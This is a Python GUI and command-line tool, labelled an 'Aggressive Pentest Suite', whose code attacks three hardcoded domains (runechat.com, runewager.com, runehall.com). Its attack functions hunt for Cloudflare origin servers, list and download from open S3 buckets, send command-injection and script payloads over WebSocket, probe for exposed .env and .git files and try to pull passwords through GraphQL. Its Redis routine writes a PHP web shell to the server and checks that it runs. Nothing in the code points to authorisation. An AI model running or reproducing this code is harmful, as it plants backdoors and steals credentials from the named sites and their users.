#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import requests
import socket
import redis
import websocket
import ssl
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import time
import re

# =====================================================================
# AUTO-SETUP SECTION - RUNS ON FIRST LAUNCH
# =====================================================================
def setup_environment():
    """Automatically configures WSL2 environment for penetration testing"""
    print("🔧 Setting up WSL2 penetration testing environment...")

    # Install system dependencies
    subprocess.run(['sudo', 'apt', 'update'], check=True)
    subprocess.run([
        'sudo', 'apt', 'install', '-y',
        'python3-pip', 'redis-tools',
        'curl',
        'dnsutils', 'nmap', 'sslscan', 'git',
        'x11-apps', 'python3-tk'
    ], check=True)

    # Install Python dependencies
    subprocess.run([
        sys.executable, '-m', 'pip', 'install',
        'requests', 'beautifulsoup4', 'redis',
        'websocket-client', 'python-nmap'
    ], check=True)

    # Configure X11 forwarding
    wsl_conf_path = '/etc/wsl.conf'
    x11_config = (
        "[automount]\n"
        "options = metadata\n\n"
        "[interop]\n"
        "appendWindowsPath = true\n\n"
        "[boot]\n"
        "systemd = true\n"
    )

    with open(wsl_conf_path, 'w') as f:
        f.write(x11_config)

    # Configure DISPLAY in .bashrc
    bashrc_path = os.path.expanduser('~/.bashrc')

    display_config = (
        "\n# X11 Forwarding Configuration\n"
        "export DISPLAY=$(awk '/nameserver / {print $2; exit}' /etc/resolv.conf):0\n"
        "export LIBGL_ALWAYS_INDIRECT=1\n"
        "export GDK_SCALE=1\n"
        "export QT_AUTO_SCREEN_SCALE_FACTOR=1\n"
    )

    with open(bashrc_path, 'a') as f:
        f.write(display_config)

    print("✅ Setup complete! Please restart WSL2 with: `wsl --shutdown` and reopen")
    return True

# Check if setup is needed
if not os.path.exists('/usr/bin/redis-cli') or not os.path.exists('/usr/bin/nmap'):
    try:
        if messagebox.askyesno("Setup Required", "Penetration testing tools not found. Install dependencies?"):
            setup_environment()
            messagebox.showinfo("Setup Complete", "Environment configured! Please restart WSL2.")
            sys.exit(0)
    except Exception as e:
        messagebox.showerror("Setup Failed", f"Error during setup: {str(e)}")
        sys.exit(1)

# =====================================================================
# PENETRATION TESTING TOOL
# =====================================================================
class PentestTool:
    def __init__(self, root=None):
        self.targets = {
            "runechat.com": ["chat", "dev", "secure"],
            "runewager.com": ["admin", "api", "staging", "support"],
            "runehall.com": ["api", "sockets", "wss", "420", "69"]
        }

        self.headless = root is None
        self.root = root

        if not self.headless:
            self.setup_gui()
        else:
            print("🚀 Starting in headless aggressive attack mode")

    def setup_gui(self):
        """Set up the GUI interface"""
        self.root.title("Aggressive Pentest Suite v3.0")
        self.root.geometry("1000x750")

        self.root.configure(bg='#0a0a0a')

        # Configure styles
        style = ttk.Style()
        style.configure('TFrame', background='#0a0a0a')
        style.configure('TButton', background='#d32f2f', foreground='white',
                        font=('Courier', 10, 'bold'))
        style.map('TButton', background=[('active', '#ff6659')])
        style.configure('TLabel', background='#0a0a0a', foreground='#e0e0e0')

        style.configure('TLabelframe', background='#0a0a0a', foreground='#d32f2f')
        style.configure('TLabelframe.Label', background='#0a0a0a', foreground='#d32f2f')

        # Header
        header = ttk.Frame(self.root)
        header.pack(fill='x', padx=15, pady=15)

        title = ttk.Label(header, text="AGGRESSIVE PENETRATION FRAMEWORK",
                       font=('Courier', 18, 'bold'), foreground='#d32f2f')
        title.pack()

        subtitle = ttk.Label(header, text="Execute real attacks against target infrastructure",
                           font=('Courier', 11), foreground='#bdbdbd')
        subtitle.pack(pady=5)

        # Target Selection
        target_frame = ttk.LabelFrame(self.root, text=" TARGET CONFIGURATION ")
        target_frame.pack(fill='x', padx=15, pady=10)

        ttk.Label(target_frame, text="Select Target Domain:").pack(anchor='w', padx=10, pady=5)
        self.domain_var = tk.StringVar(value="runechat.com")
        domain_combo = ttk.Combobox(target_frame, textvariable=self.domain_var,
                                   values=list(self.targets.keys()), width=40)

        domain_combo.pack(padx=10, pady=5, fill='x')

        # Attack Modules
        attack_frame = ttk.LabelFrame(self.root, text=" ATTACK MODULES ")
        attack_frame.pack(fill='x', padx=15, pady=10)

        self.attack_vars = {}
        attacks = [
            ("Cloudflare Origin Exposure", "cf_origin"),
            ("S3 Bucket Hijacking", "s3_hijack"),
            ("WebSocket Exploitation", "ws_exploit"),
            ("Redis Unauthenticated Access", "redis_hack"),
            ("Subdomain Bruteforce", "subdomain_brute"),
            ("API Endpoint Attacks", "api_attack"),
            ("Port Scanning", "port_scan"),
            ("SSL Vulnerability Scanning", "ssl_scan")
        ]

        for text, var in attacks:
            frame = ttk.Frame(attack_frame)
            frame.pack(fill='x', padx=5, pady=2)

            var_obj = tk.BooleanVar(value=True)
            cb = ttk.Checkbutton(frame, text=text, variable=var_obj)

            cb.pack(side='left', anchor='w')
            self.attack_vars[var] = var_obj

        # Execution Control
        control_frame = ttk.Frame(self.root)
        control_frame.pack(fill='x', padx=15, pady=15)

        self.execute_btn = ttk.Button(control_frame, text="🚀 EXECUTE ATTACKS",
                               command=self.start_attacks, width=20)
        self.execute_btn.pack(side='left', padx=5)

        self.stop_btn = ttk.Button(control_frame, text="🛑 ABORT OPERATION",
                                  state='disabled', width=20, command=self.stop_attacks)
        self.stop_btn.pack(side='left', padx=5)

        # Results Display
        results_frame = ttk.LabelFrame(self.root, text=" EXPLOITATION RESULTS ")
        results_frame.pack(fill='both', expand=True, padx=15, pady=10)

        self.results = scrolledtext.ScrolledText(
            results_frame,
            bg='#111111',
            fg='#ff6659',
            insertbackground='red',
            font=('Courier', 10),
            wrap='word'
        )
        self.results.pack(fill='both', expand=True, padx=10, pady=10)
        self.results.tag_config('critical', foreground='#ff0000', font=('Courier', 10, 'bold'))
        self.results.tag_config('success', foreground='#00ff00')
        self.results.tag_config('warning', foreground='#ffff00')
        self.log("> Attack console ready - select targets and execute")

        # Status Bar
        self.status_var = tk.StringVar(value="🟢 Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var,
                             relief='sunken', anchor='w', font=('Courier', 9))
        status_bar.pack(side='bottom', fill='x')

        self.attack_active = False

    def log(self, message, tag=None):
        """Log messages to console or GUI"""
        timestamp = time.strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {message}"

        if self.headless:
            print(log_message)
        else:
            self.results.configure(state='normal')
            self.results.insert('end', log_message + '\n', tag)
            self.results.see('end')
            self.results.configure(state='disabled')

    def start_attacks(self):
        """Start all selected attacks"""
        if self.headless:
            target = sys.argv[1] if len(sys.argv) > 1 else "runechat.com"
            self.run_attacks(target)
            return

        self.attack_active = True
        self.execute_btn['state'] = 'disabled'
        self.stop_btn['state'] = 'normal'
        self.status_var.set("🔴 Attacks in progress...")

        target = self.domain_var.get()

        attack_thread = threading.Thread(target=self.run_attacks, args=(target,))
        attack_thread.daemon = True
        attack_thread.start()

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_active = False
        self.log("🛑 Attack sequence aborted by user", 'warning')
        self.status_var.set("🟠 Attacks aborted")
        self.stop_btn['state'] = 'disabled'
        self.execute_btn['state'] = 'normal'

    def run_attacks(self, domain):
        """Execute all selected attacks against target domain"""
        self.log(f"🚀 Starting aggressive attacks against {domain}", 'success')
        start_time = time.time()

        try:
            with ThreadPoolExecutor(max_workers=6) as executor:
                # Cloudflare attacks
                if domain in ["runechat.com", "runehall.com"] and self.attack_vars["cf_origin"].get():
                    executor.submit(self.cf_origin_attack, domain)

                # AWS attacks
                if domain == "runewager.com" and self.attack_vars["s3_hijack"].get():
                    executor.submit(self.s3_bucket_attack, domain)

                # WebSocket attacks
                if domain == "runehall.com" and self.attack_vars["ws_exploit"].get():
                    executor.submit(self.websocket_attack, domain)

                # Redis attacks
                if domain == "runehall.com" and self.attack_vars["redis_hack"].get():
                    executor.submit(self.redis_attack, domain)

                # Always run these
                if self.attack_vars["subdomain_brute"].get():
                    executor.submit(self.subdomain_bruteforce, domain)

                if self.attack_vars["api_attack"].get():
                    executor.submit(self.api_attacks, domain)

                if self.attack_vars["port_scan"].get():
                    executor.submit(self.port_scan, domain)

                if self.attack_vars["ssl_scan"].get():
                    executor.submit(self.ssl_scan, domain)
        except Exception as e:
            self.log(f"⚡ Attack thread failed: {str(e)}", 'critical')

        elapsed = time.time() - start_time
        self.log(f"✅ All attack threads completed in {elapsed:.2f} seconds", 'success')

        if not self.headless:
            self.execute_btn['state'] = 'normal'
            self.stop_btn['state'] = 'disabled'
            self.status_var.set(f"🟢 Completed in {elapsed:.2f}s")

    # =================================================================
    # ATTACK METHODS
    # =================================================================
    def cf_origin_attack(self, domain):
        """Aggressive Cloudflare origin discovery"""
        self.log(f"[CLOUDFLARE] Targeting {domain}", 'warning')

        # Historical IP discovery
        try:
            self.log("Checking historical DNS records...")
            result = subprocess.check_output(
                f"curl -s 'https://securitytrails.com/list/ip/{domain}' | grep -Eo '([0-9]{{1,3}}\\.){{3}}[0-9]{{1,3}}' | sort -u",
                shell=True, text=True, timeout=30
            )
            ips = result.strip().split('\n')
            if ips and ips[0]:
                self.log(f"Historical IPs found: {', '.join(ips)}")
            else:
                self.log("No historical IPs found", 'warning')
                return

            # Direct connection attempts
            for ip in ips:
                if not self.attack_active:
                    return

                try:
                    self.log(f"Attempting direct connection to {ip}")
                    response = requests.get(
                        f"http://{ip}",
                        headers={"Host": domain},
                        timeout=5,
                        verify=False
                    )
                    if domain in response.text:
                        self.log(f"CRITICAL: Origin server exposed - {ip}", 'critical')
                        return
                except requests.exceptions.RequestException:
                    continue
        except Exception as e:
            self.log(f"Cloudflare attack failed: {str(e)}", 'critical')

    def s3_bucket_attack(self, domain):
        """AWS S3 bucket takeover attempts"""
        self.log(f"[AWS S3] Targeting {domain}", 'warning')

        bucket_names = [
            domain,
            f"{domain}-dev",
            f"{domain}-staging",
            f"{domain}-prod",
            f"{domain}-backup",
            "www." + domain,
            "dev-" + domain,
            "staging-" + domain,
            "prod-" + domain,
            "assets-" + domain,
            f"s3-{domain}",
            f"storage-{domain}"
        ]

        for bucket in bucket_names:
            if not self.attack_active:
                return

            try:
                url = f"http://{bucket}.s3.amazonaws.com"
                self.log(f"Checking bucket: {url}")

                # Check for open bucket
                response = requests.head(url, timeout=3)
                if response.status_code == 200:
                    self.log(f"OPEN BUCKET FOUND: {url}", 'critical')

                    # Try listing contents
                    list_url = f"{url}?list-type=2"
                    response = requests.get(list_url, timeout=5)
                    if "<ListBucketResult" in response.text:
                        soup = BeautifulSoup(response.text, 'xml')
                        keys = [key.text for key in soup.find_all('Key')]
                        self.log(f"Bucket contents: {', '.join(keys[:3])}...")

                        # Attempt file download
                        if keys:
                            test_file = keys[0]
                            file_url = f"{url}/{test_file}"

                            response = requests.get(file_url, timeout=5)
                            self.log(f"File content sample: {response.text[:100]}...")
            except requests.exceptions.RequestException:
                continue

    def websocket_attack(self, domain):
        """WebSocket manipulation attacks"""
        self.log(f"[WEBSOCKET] Targeting wss.{domain}", 'warning')

        try:
            ws_url = f"wss://wss.{domain}"

            # Create WebSocket connection
            self.log(f"Connecting to {ws_url}")
            ws = websocket.WebSocket()
            ws.connect(ws_url, timeout=10)

            # Send malicious payloads
            payloads = [
                '{"action":"getUser","token":"admin"}',
                '{"action":"getConfig"}',
                '{"action":"getCredentials"}',
                '{"action":"ping", "data":"<script>alert(1)</script>"}',
                '{"action":"debug","level":"verbose"}',
                '{"action":"system","command":"id"}'
            ]

            for payload in payloads:
                if not self.attack_active:
                    ws.close()
                    return

                self.log(f"Sending payload: {payload[:50]}...")
                ws.send(payload)

                try:
                    response = ws.recv()
                    self.log(f"Response: {response[:200]}...")

                    # Check for sensitive data
                    if "password" in response.lower() or "secret" in response.lower():
                        self.log("CRITICAL: Sensitive data exposed in WebSocket!", 'critical')
                except websocket.WebSocketTimeoutException:
                    self.log("No response received", 'warning')

            ws.close()
        except Exception as e:
            self.log(f"WebSocket attack failed: {str(e)}", 'critical')

    def redis_attack(self, domain):
        """Redis unauthorized access exploitation"""
        self.log(f"[REDIS] Targeting sockets.{domain}", 'warning')

        try:
            r = redis.Redis(
                host=f"sockets.{domain}",
                port=6379,
                socket_timeout=5,
                socket_connect_timeout=5
            )

            # Check connection
            if r.ping():
                self.log("Redis server accessible without authentication!", 'critical')

                # Attempt to write web shell
                self.log("Attempting web shell write...")
                try:
                    r.config_set('dir', '/var/www/html')
                    r.config_set('dbfilename', 'shell.php')
                    r.set('payload', '<?php system($_GET["cmd"]); ?>')
                    r.save()

                    # Verify shell
                    url = f"http://sockets.{domain}/shell.php?cmd=id"
                    response = requests.get(url, timeout=5)
                    if "uid=" in response.text:
                        self.log(f"WEB SHELL ACTIVE: {url}", 'critical')
                    else:
                        self.log("Web shell write failed", 'warning')
                except redis.ResponseError as e:
                    self.log(f"Server protected: {str(e)}", 'warning')

                # Dump keys
                keys = r.keys('*')
                self.log(f"Redis keys: {keys[:5]}...")

                # Check for sensitive data
                for key in keys[:3]:
                    try:
                        value = r.get(key)
                        if value and (b'pass' in value or b'secret' in value):
                            self.log(f"Sensitive data found in key {key}: {value[:100]}...", 'critical')
                    except:
                        continue
            else:
                self.log("Redis server protected")
        except Exception as e:
            self.log(f"Redis attack failed: {str(e)}", 'critical')

    def subdomain_bruteforce(self, domain):
        """Aggressive subdomain enumeration"""
        self.log(f"[SUBDOMAIN] Targeting {domain}", 'warning')

        # Load wordlist
        wordlist = self.targets[domain] + [
            "admin", "api", "test", "dev", "staging",
            "secure", "internal", "vpn", "ns", "mail",
            "web", "app", "beta", "backup", "cms",
            "db", "mysql", "ssh", "ftp", "mx"
        ]

        # DNS bruteforce
        for sub in wordlist:
            if not self.attack_active:
                return

            target = f"{sub}.{domain}"
            try:
                socket.gethostbyname(target)
                self.log(f"Subdomain found: {target}", 'success')

                # Check for web server
                try:
                    response = requests.get(f"http://{target}", timeout=2)
                    self.log(f"HTTP {response.status_code} from {target}")

                    # Check for interesting files
                    for path in ["/.env", "/.git/config", "/robots.txt", "/wp-config.php"]:
                        try:
                            resp = requests.get(f"http://{target}{path}", timeout=2)
                            if resp.status_code == 200:
                                self.log(f"EXPOSED FILE: {target}{path}", 'critical')
                        except:
                            continue

                except:
                    pass
            except socket.gaierror:
                pass

    def api_attacks(self, domain):
        """Aggressive API endpoint testing"""
        self.log(f"[API] Targeting {domain}", 'warning')

        endpoints = [
            f"https://api.{domain}/user",
            f"https://api.{domain}/admin",
            f"https://api.{domain}/config",
            f"https://api.{domain}/v1/users",
            f"https://api.{domain}/graphql",
            f"https://{domain}/api/v1/users",
            f"https://{domain}/graphql"
        ]

        for endpoint in endpoints:
            if not self.attack_active:
                return

            try:
                # IDOR Attack
                self.log(f"Testing IDOR on {endpoint}")
                response = requests.get(
                    f"{endpoint}/12345",
                    headers={"Authorization": "Bearer invalid"},
                    timeout=3
                )
                if response.status_code == 200 and ("email" in response.text or "user" in response.text):
                    self.log(f"IDOR VULNERABLE: {endpoint}", 'critical')

                # GraphQL Injection
                if "graphql" in endpoint:
                    self.log(f"Testing GraphQL on {endpoint}")
                    payload = {"query": "{__schema{types{name}}}"}
                    response = requests.post(endpoint, json=payload, timeout=3)
                    if "__schema" in response.text:
                        self.log("GraphQL introspection enabled!", 'critical')

                        # Try to extract sensitive data
                        payload = {"query": "{user {id, email, password}}"}
                        response = requests.post(endpoint, json=payload, timeout=3)
                        if "user" in response.text:
                            self.log(f"Data exposure: {response.text[:200]}...", 'critical')
            except Exception as e:
                self.log(f"API test failed for {endpoint}: {str(e)}")

    def port_scan(self, domain):
        """Aggressive port scanning"""
        self.log(f"[PORT SCAN] Targeting {domain}", 'warning')

        try:
            # Resolve domain to IP
            ip = socket.gethostbyname(domain)
            self.log(f"Resolved {domain} to {ip}")

            # Common ports to scan
            ports = [21, 22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]

            for port in ports:
                if not self.attack_active:
                    return

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    self.log(f"Port {port} OPEN on {domain}", 'success')
                sock.close()
        except Exception as e:
            self.log(f"Port scan failed: {str(e)}")

    def ssl_scan(self, domain):
        """SSL/TLS vulnerability scanning"""
        self.log(f"[SSL SCAN] Targeting {domain}", 'warning')

        try:
            # Check SSL/TLS versions
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    self.log(f"SSL/TLS version: {ssock.version()}")

            # Check for weak ciphers
            weak_ciphers = [
                'DES', 'RC4', 'MD5', 'SHA1', 'NULL',
                'EXPORT', 'ANON', 'CBC', '3DES'
            ]

            try:
                context = ssl.create_default_context()
                context.set_ciphers(':'.join(weak_ciphers))
                with socket.create_connection((domain, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        self.log(f"WEAK CIPHER SUPPORTED: {ssock.cipher()[0]}", 'critical')
            except ssl.SSLError:
                self.log("No weak ciphers supported", 'success')
        except Exception as e:
            self.log(f"SSL scan failed: {str(e)}")

# =====================================================================
# MAIN EXECUTION
# =====================================================================
if __name__ == "__main__":
    # Check for headless mode
    headless_mode = '--headless' in sys.argv or not os.getenv('DISPLAY')

    if headless_mode:
        if len(sys.argv) > 1 and sys.argv[1] in ["runechat.com", "runewager.com", "runehall.com"]:
            tool = PentestTool()
            tool.run_attacks(sys.argv[1])
        else:
            print("Usage in headless mode:")
            print("  python3 pentest_tool.py <domain>")
            print("Available domains: runechat.com, runewager.com, runehall.com")
            sys.exit(1)
    else:
        root = tk.Tk()
        app = PentestTool(root)
        root.mainloop()